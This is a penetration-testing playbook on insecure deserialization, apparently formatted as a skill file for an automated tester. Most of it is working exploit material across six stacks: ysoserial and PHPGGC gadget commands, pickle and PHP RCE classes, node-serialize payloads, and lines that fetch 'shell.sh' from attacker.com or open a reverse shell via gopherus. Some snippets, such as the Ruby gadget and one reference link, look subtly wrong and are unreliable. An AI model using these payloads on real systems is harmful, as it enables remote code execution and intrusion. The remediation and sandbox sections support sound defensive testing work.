# Insecure Deserialization — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter)
**OWASP Mapping:** A08:2021 – Software and Data Integrity Failures
**Severity:** Critical / High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: insecure-deserialization-v2
category: penetration-testing
author: HiveBreach
mitre_attack_id: T1190
owasp_mapping:
  - A08:2021-Software and Data Integrity Failures
tags:
  - deserialization
  - rce
  - java
  - python
  - php
  - node
  - ruby
  - dotnet
  - phar
  - gadget-chain
  - T1190
  - T1059
  - T1203
environments:
  - web
  - api
  - java
  - python
  - php
  - node
  - ruby
  - dotnet
  - message-queue
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Entry Point Enumeration

Find where serialized data crosses a trust boundary:

| Location | Indicator | Risk |
|---|---|---|
| Cookies (Java/JSESSIONID, PHP) | Base64 or binary blob in cookie | High |
| POST bodies | `java-serialized`, `application/x-java-serialized-object` | High |
| URL parameters | `data`, `payload`, `state`, `session` | Medium |
| Hidden form fields | `__VIEWSTATE` (.NET) | High |
| Cache / Redis keys | `redis-cli --raw GET key` (PHP `serialize()` format) | High |
| Java RMI / JMX | `java -jar ysoserial.jar RMI...` | High |
| Message queues (Kafka, RabbitMQ) | serialized event payloads | Medium |
| Auth tokens / JWT with `"typ":"JWT"` | base64 embedded objects | Medium |
| File uploads (.phar, .jar, .ser, .pickle) | magic bytes in uploaded file | High |

### 1.2 Magic Bytes Identification

| Format | Magic Bytes / Signature | Notes |
|---|---|---|
| Java ObjectInputStream | `AC ED 00 05` (also base64 `rO0AB...`) | starts all `ObjectOutputStream` data |
| Java serialized (base64) | `rO0ABXNyAB...` | common in cookies / `data` params |
| PHP `serialize()` | `a:1:{`, `O:8:"ClassName"`, `s:4:"name"` | string-repr, not binary |
| PHP `phar://` | `<?php ... __HALT_COMPILER(); ?>` stub + manifest | file-based, `.phar`, `.tar`, `.zip` header |
| Python `pickle` | protocol 0 ASCII, proto 2+ `80 03 00` | `c` / `g` opcodes; `python3 pickle` bytes |
| Ruby `Marshal` | `04 08` (both `\x04\x08`) | begins all Marshal.dump |
| .NET BinaryFormatter | `00 01 00 00 00 FF FF` (base64 `AAEAAAD/////`) | also `10 00` base64 `EAAA...` |
| Node `node-serialize` | JSON with `_$$ND_FUNC$$_` marker | function stringification |
| Node `serialize-javascript` | JSON with functions | detectable in JS source |

```bash
# Identify a captured blob
echo -n "rO0ABXNy..." | base64 -d | xxd | head
# AC ED 00 05 → Java
# 04 08 → Ruby Marshal
# 00 01 00 00 00 FF FF → .NET BinaryFormatter
```

### 1.3 Detection by Stack

- **Java:** `JSESSIONID` containing `rO0AB`, `Content-Type: application/x-java-serialized-object`, `HTTPHeader "Java"`, Spring `data` params
- **PHP:** `serialize()` patterns in cookies / DB fields, `.phar` file uploads with `phar://` stream wrappers, `unserialize()` on user input
- **Python:** base64 strings starting `gASV` / `0x8003` used in session cookies (Flask `pickle`), `pickle.loads` on uploads
- **Ruby:** `\x04\x08` blobs in cookies, `Marshal.load` on session data
- **.NET:** `__VIEWSTATE`, `__EVENTVALIDATION`, `ViewStateUserKey` absent, machineKey guessable
- **Node.js:** `node-serialize` `_$$ND_FUNC$$_` markers, `serialize-javascript` with `eval`

### 1.4 Detection with Tools

```bash
# Screaming Frog-like: just grep base64 Java sig
grep -rE "rO0AB|ACED0005|AAEAAAD/////" intercepted-traffic.txt

# Identify via python
python3 -c "import base64,sys; print(base64.b64decode(sys.argv[1])[:8].hex())" 'rO0AB...'
```

**Nuclei deserialization templates:**
```bash
nuclei -u https://target.com -t ~/nuclei-templates/vulnerabilities/ -tags deserialization,ysoserial -jsonl out.jsonl
```

---

## 2. Confirmation

### 2.1 Format Fingerprinting

| Magic | Likely Format | Confirm With |
|---|---|---|
| `AC ED 00 05` | Java | `jshell` / `ObjectInputStream` |
| `a:`, `O:`, `s:` | PHP serialize | `php -r "var_dump(unserialize(..."` |
| `80 02/03/04` or `gASV` base64 | Python pickle | `pickle.loads` in Python |
| `04 08` | Ruby Marshal | `Marshal.load` in Ruby |
| `00 01 00 00 00 FF FF` | .NET BinaryFormatter | `BinaryFormatter.Deserialize` |
| `_$$ND_FUNC$$_` | node-serialize | regex search of source/requests |
| `<?php __HALT_COMPILER` | PHAR | `php -r 'var_dump(new Phar(...))'` |

### 2.2 Non-RCE Confirmation

Before RCE, prove deserialization happens at all:

```bash
# Java: send a crafted-but-harmless serialized object and time the response
curl -s -X POST https://target.com/app -H "Content-Type: application/x-java-serialized-object" \
  -H "Cookie: session=$(python3 -c "print('rO0ABXQABHRlc3Q=')")" -o /dev/null -w "%{time_total}\n"

# PHP: send serialize() string; if a Class with __wakeup logs, you get a callback
```

### 2.3 OOB Confirmation (PHPGGC / ysoserial)

```bash
# PHPGGC with __wakeup callback / DNS exfil
phpggc Monolog/RCE7 system "ping -c1 <unique>.interactsh.example.com"

# ysoserial with DNS
java -jar ysoserial.jar URLDNS "http://<unique>.interactsh.example.com" | base64 -w0
```

A DNS/HTTP callback on the unique host confirms the chain executed.

### 2.4 Confirmation Checklist

- [ ] Serialization format and stack identified
- [ ] Deserialization entry point proven (response diff / timing / error)
- [ ] Gadget chain produces deterministic callback in sandbox
- [ ] RCE only attempted against the sandbox replica, not production

---

## 3. Exploitation

### 3.1 PHP Deserialization

**Gadget chains via PHPGGC:**
```bash
# List available gadget chains
phpggc -l

# Generate a chain (system command, RCE1 class)
phpggc -p base64 -o payload.b64 Monolog/RCE1 system 'id'

# PHP 5.5 - 8.x viable chains
phpggc -p base64 -o payload.b64 Laravel/RCE1 system 'id'
phpggc -p base64 -o payload.b64 Symfony/RCE4 system 'id'
phpggc -p base64 -o payload.b64 Slim/RCE1 system 'id'
phpggc -p base64 -o payload.b64 Guzzle/RCE1 system 'id'
phpggc -p base64 -o payload.b64 PHPExcel/FTP1 'attacker.com 21'
```

**Manual `__wakeup` / `__destruct` trigger:**
```php
<?php
class Evil {
  public $cmd;
  function __destruct() { system($this->cmd); }
}
echo base64_encode(serialize(new Evil()));
// O:4:"Evil":1:{s:3:"cmd";s:2:"id";}
?>
```

```bash
curl -X POST https://target.com/page --data-urlencode "data=O:4:%22Evil%22:1:{s:3:%22cmd%22;s:2:%22id%22;}"
```

**PHAR deserialization (`phar://` wrapper):**
```bash
# Build a phar whose metadata holds the payload
php -r '
  $phar = new Phar("payload.phar");
  $phar->startBuffering();
  $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
  $o = new Evil(); $o->cmd = "id";
  $phar->setMetadata($o);
  $phar->addFromString("test.txt", "test");
  $phar->stopBuffering();
  @unlink("payload.phar");
  rename("payload.phar", "payload.phar.gif");
'
```

```bash
# Trigger on file-existence checks, getimagesize, fopen, etc.
curl "https://target.com/file.php?name=phar://uploads/payload.phar.gif/test.txt"
```

**Cookie-based (WordPress / Magento style):**
```bash
# Serialized object in cookie triggers __wakeup on read
curl -s https://target.com/ -H "Cookie: user=$(phpggc -p base64 Wordpress/RCE4 system 'id')" -o /dev/null -w "%{http_code}\n"
```

### 3.2 Java Deserialization

**ysoserial gadget chains:**
```bash
# Generate raw payload
java -jar ysoserial.jar CommonsCollections1 'id'

# Pipe to target (base64 cookie)
java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0

# Common chains by library:
java -jar ysoserial.jar CommonsCollections2 'id'
java -jar ysoserial.jar CommonsCollections4 'id'
java -jar ysoserial.jar CommonsCollections5 'id'
java -jar ysoserial.jar CommonsCollections6 'id'
java -jar ysoserial.jar CommonsBeanutils1 'id'
java -jar ysoserial.jar CommonsBeanutils2 'id'
java -jar ysoserial.jar Groovy1 'id'
java -jar ysoserial.jar Hibernate1 'id'
java -jar ysoserial.jar Spring1 'id'
java -jar ysoserial.jar JRMPClient '10.0.0.5:1099'
java -jar ysoserial.jar URLDNS 'http://<unique>.interactsh.example.com'
```

**URLDNS for blind confirmation (no deps needed):**
```bash
java -jar ysoserial.jar URLDNS "http://<unique>.interactsh.example.com" > urldns.bin
curl -s -X POST https://target.com/app -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @urldns.bin
```

**JNDI / LDAP injection (log4j-style) chains:**
```bash
# 1. Serve evil class remotely (JNDI-Exploit-Kit / marshalsec)
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389

# 2. Payload
java -jar ysoserial.jar Jdk7u21 '${jndi:ldap://127.0.0.1:1389/Exploit}'
java -jar ysoserial.jar Jdk7u21 '${jndi:rmi://127.0.0.1:1099/Exploit}'
```

**Java RMI exploitation:**
```bash
# Target RMI registry directly
java -jar ysoserial.jar JRMPListener 1099 CommonsCollections1 'id'
# Or use the gadget server to get a shell on registry deserialization
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 10.0.0.5 1099 CommonsCollections1 'id'
```

### 3.3 Python Deserialization

**Pickle RCE:**
```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ("id",))

print(base64.b64encode(pickle.dumps(RCE())).decode())
```

```bash
curl -X POST https://target.com/app --data-urlencode "data=$(python3 pickle_rce.py)"
```

**Without `pickle` on the client (hand-crafted opcodes):**
```python
import pickle

# Malicious __reduce__ requires the class to exist server-side, or use builtins
class Exploit:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id')",))
```

**`__reduce__` tricks:**
```python
def __reduce__(self):
    import os
    return (os.system, ("curl attacker.com/shell.sh | sh",))
```

**Alternative sinks: `marshmallow` + `_deserialize` / `__getattr__` chains:**
```python
class Evil:
    def __getattr__(self, name):
        import os
        os.system("id")
```

### 3.4 Ruby Deserialization

**Marshal.load RCE (Universal Deserialisation Gadget):**
```ruby
require 'marshal'

class Gem::Requirement
  def marshal_dump
    [Gem::Package::TarReader]
  end

  def marshal_load(array)
    array[0].new(Gem::Package::TarReader::Entry)
  end
end

payload = Marshal.dump(Gem::Requirement.new)
puts Base64.strict_encode64(payload)
```

```bash
curl -X POST https://target.com/session --data-binary "$(ruby gen.rb)" -H "Cookie: session=$(ruby gen.rb | base64 -w0)"
```

### 3.5 .NET Deserialization

**BinaryFormatter RCE (ysoserial.net):**
```bash
# ysoserial.net on Windows / dotnet
ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -c "cmd /c calc"

# Alternative gadgets
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c whoami"
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -c "cmd /c net user"
```

**ViewState deserialization:**
```bash
# Requires knowing machineKey or low integrity validation
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --validationalg="SHA1" --generator="..." --decryptionalg="AES" --decryptionkey="..." \
  --payload="/path/to/App.Web.UI" -c "cmd /c whoami"

# Or against known-vulnerable default key scenarios
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c calc"
```

### 3.6 Node.js Deserialization

**node-serialize RCE:**
```
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('id', function(e,s){print(s)}) }()"}
```

```bash
curl -X POST https://target.com/app -H "Content-Type: application/json" \
  --data '{"payload":"_$$ND_FUNC$$_function(){return require(\"child_process\").execSync(\"id\").toString()}()"}'
```

**serialize-javascript / eval sinks:**
```javascript
// Payload delivered where JSON is passed through eval() or Function()
JSON.parse('{"x":"function(){ return process.mainModule.require(\'child_process\').execSync(\'id\').toString() }"}')
```

### 3.7 Redis / Gopher Deserialization Chains

```bash
# Write a PHP serialized payload into a Redis key consumed by the app
gopherus --exploit redis --rhost 127.0.0.1 --rport 6379 \
  --lhost attacker.com --lport 4444

# Redis SET of a pickle payload consumed by a Python worker
redis-cli -h 127.0.0.1 SET "task:1" "8003 636f73 0a7379..."   # pickled object
```

---

## 4. Tool-Specific Guidance

### 4.1 ysoserial (Java)

```bash
# List all chains
java -jar ysoserial.jar

# Base64 output for cookie injection
java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0

# Verbose for debugging (also -t for "you rolled a Die" fuzzing)
java -jar ysoserial.jar --verbose CommonsCollections1 'id'

# CommonsBeanutils best when commons-collections is stripped
java -jar ysoserial.jar CommonsBeanutils1 'id'
```

### 4.2 ysoserial.net

```bash
ysoserial.exe -p BinaryFormatter -g TypeConfuseDelegate -c "cmd /c whoami"
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --validationalg="SHA1" --generator="VIEWSTATE"
ysoserial.exe -p JSON -g TypeConfuseDelegate -c "cmd /c calc"
ysoserial.exe -p XmlSerializer -g ObjectDataProvider -c "cmd /c whoami"
```

### 4.3 PHPGGC

```bash
phpggc -l                          # list chains
phpggc -i Monolog/RCE1              # info on chain
phpggc -s Monolog/RCE1 system id    # print raw payload
phpggc -p base64 -o out.b64 Monolog/RCE1 system 'id'
phpggc -p gzip Monolog/RCE1 system 'id'
phpggc -p serialize Monolog/RCE1 system 'id'
```

### 4.4 Python

```bash
# Quick pickle payload generation
python3 - <<'EOF'
import pickle, base64, os
class X:
    def __reduce__(self):
        return (os.system, ("id",))
print(base64.b64encode(pickle.dumps(X())).decode())
EOF
```

### 4.5 Ruby

```bash
# Universal Gadget generator (see 3.4)
ruby marshal_payload.rb | base64 -w0
```

### 4.6 Redis / Message Queue

```bash
gopherus --exploit redis --rhost 127.0.0.1 --rport 6379 --lhost attacker.com --lport 4444
redis-cli -h 127.0.0.1 SET key "O:4:\"Evil\":1:{s:3:\"cmd\";s:2:\"id\";}"
```

---

## 5. PoC Generation

### PoC Template

```markdown
## Insecure Deserialization — [FINDING_ID]

**URL:** https://target.com/app
**Entry Point:** Cookie `session` / POST body / __VIEWSTATE / upload
**Format:** Java (AC ED 00 05) / PHP serialize / Python pickle / Ruby Marshal / .NET BinaryFormatter / Node
**Gadget Chain:** CommonsCollections6 / Monolog/RCE1 / __reduce__ / Marshal.load / BinaryFormatter
**Impact:** RCE / File read / DoS

### Payload
```
(base64 or raw serialized blob)
```

### Evidence
- [Base64 blob that produced callback on interactsh.example.com]
- [Command output / reverse shell session]
- [Timing / error difference proving deserialization]

### Impact
- RCE: YES/NO (id, whoami output captured)
- Affected stack: Java/PHP/Python/Ruby/.NET/Node
- Reusable across other entry points: list them

### Remediation
- Use JSON/msgpack instead of native serializers for untrusted input
- Validate serialized data against strict allow-list (class whitelist)
- Never `unserialize` / `pickle.loads` / `Marshal.load` / `BinaryFormatter.Deserialize` / `readObject` on user input
- Sign/encrypt serialized data (HMAC + key rotation), bind to session
- Disable PHAR stream wrapper; set `phar.readonly=1` and remove `phar://`
- Keep libraries patched; gadget chains depend on known classes
- .NET: set `ViewStateUserKey`, use `SerializationBinder` restrictions, `MachineKey` rotation

### Reproduction Steps
1. Capture the serialized blob and identify magic bytes
2. Generate gadget payload with ysoserial / PHPGGC / custom __reduce__
3. Inject into entry point; observe callback / output
4. Escalate to reverse shell in sandbox
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Full reproduction in Docker/VM matching the target stack version
- [ ] Gadget chain confirmed against a *controlled* instance of the exact library set
- [ ] Reverse shell / command execution only into sandbox container
- [ ] No production data touched; entry points recorded but not re-tested live
- [ ] OOB callback domain sandbox-owned (interactsh local / self-hosted)
- [ ] RCE verified via state-agent style post-check (id output, file marker) not just timing

### Prohibited Actions
- Executing live payloads against production hosts
- Using real production gadget classes/servers for callbacks
- Persistence on shared infrastructure
- Attempting JNDI/LDAP callbacks to third-party infrastructure

---

## 7. Cheat Sheet / Reference

### Magic Byte Quick Reference

| Format | Bytes / Marker | Language |
|---|---|---|
| Java ObjectInputStream | `AC ED 00 05` / `rO0AB` | Java |
| Java RMI | `JRMI`, `java.rmi.server` | Java |
| PHP serialize | `a:{`, `O:<n>:"` | PHP |
| PHAR | `<?php __HALT_COMPILER(); ?>` | PHP |
| Python pickle | `80 03` / `gASV` (base64) | Python |
| Ruby Marshal | `04 08` | Ruby |
| .NET BinaryFormatter | `00 01 00 00 00 FF FF` / `AAEAAAD///` | .NET |
| Node node-serialize | `_$$ND_FUNC$$_` | Node.js |

### Gadget Chain Quick Reference

| Stack | Tool | Best Chains |
|---|---|---|
| Java | ysoserial | CommonsCollections1-6, CommonsBeanutils1-2, Groovy1, Spring1, Hibernate1, Jdk7u21, URLDNS (blind) |
| Java JNDI | JNDI-Exploit-Kit / marshalsec | `${jndi:ldap://...}`, `rmi://` |
| PHP | PHPGGC | Monolog/RCE1-7, Laravel/RCE1-9, Symfony/RCE1-13, Guzzle/RCE1, Slim/RCE1, Wordpress/RCE1-5 |
| Python | manual `__reduce__` | `os.system`, `subprocess`, `eval(__import__('os')...)` |
| Ruby | universal gadget | `Gem::Requirement` -> `Gem::Package::TarReader::Entry` |
| .NET | ysoserial.net | TextFormattingRunProperties, TypeConfuseDelegate, ActivitySurrogateSelector, ViewState |
| Node.js | node-serialize | `_$$ND_FUNC$$_` eval of `require('child_process')` |

### Serialized Data Sinks

| Language | Dangerous API |
|---|---|
| Java | `ObjectInputStream.readObject()`, `XMLDecoder`, `readObjectNaked` |
| PHP | `unserialize()`, `__wakeup()`, `__destruct()`, `phar://` |
| Python | `pickle.loads`, `cPickle.loads`, `marshal.loads`, `shelve.open` |
| Ruby | `Marshal.load`, `Marshal.restore`, YAML `safe_load` misuse |
| .NET | `BinaryFormatter.Deserialize`, `LosFormatter`, `ObjectStateFormatter`, `DataContractSerializer`, `XmlSerializer` (SOAP) |
| Node.js | `node-serialize.unserialize`, `serialize-javascript` eval, `vm` misuse |

### Detection Triggers

- Request body contains `rO0AB` in cookies or params
- `Content-Type: application/x-java-serialized-object`
- `O:8:"ClassName":` in cookie / DB field values
- `__VIEWSTATE` present and not MAC-signed (`ViewStateUserKey` unset)
- File upload with PHAR stub or pickle `80 03` header
- Unusual `data` / `payload` / `state` parameters
- Legacy Java RMI ports 1099, 11099; JMX 1616/1617/9010

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial access |
| T1059 | Command and Scripting Interpreter | RCE via gadget chain |
| T1203 | Exploitation for Client Execution | Client-side deserialization (Java applets, .NET) |
| T1027 | Obfuscated Files or Information | Base64/gzip payload encoding |
| T1055 | Process Injection | ActivitySurrogateSelector chains |
| T1105 | Ingress Tool Transfer | Fetching stage-2 payloads |
| T1219 | Remote Access Software | Reverse shell stage |
| T1005 | Data from Local System | Reading files post-RCE |
| T1555 | Credentials from Password Stores | Stealing stored serialized credentials |
| T1499 | Endpoint Denial of Service | Deserialization bomb / hash collision |
| T1574 | Hijack Execution Flow | Dependency confusion in gadget classpath |

---

## 9. References

- PayloadsAllTheThings Insecure Deserialization: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
- HackTricks Deserialization: https://book.hacktricks.xyz/pentesting-web/deserialization
- ysoserial: https://github.com/frohoff/ysoserial
- ysoserial.net: https://github.com/pwntester/ysoserial.net
- PHPGGC: https://github.com/ambionics/phpggc
- marshalsec: https://github.com/mbechler/marshalsec
- JNDI-Exploit-Kit: https://github.com/pimps/ysoserial-modified
- OWASP Deserialization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- Python pickle security: https://docs.python.org/3/library/pickle.html
- Universal Deserialisation Gadget (Ruby): https://www.elttam.com/blog/ruby-deserialization-gadget-payload/

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
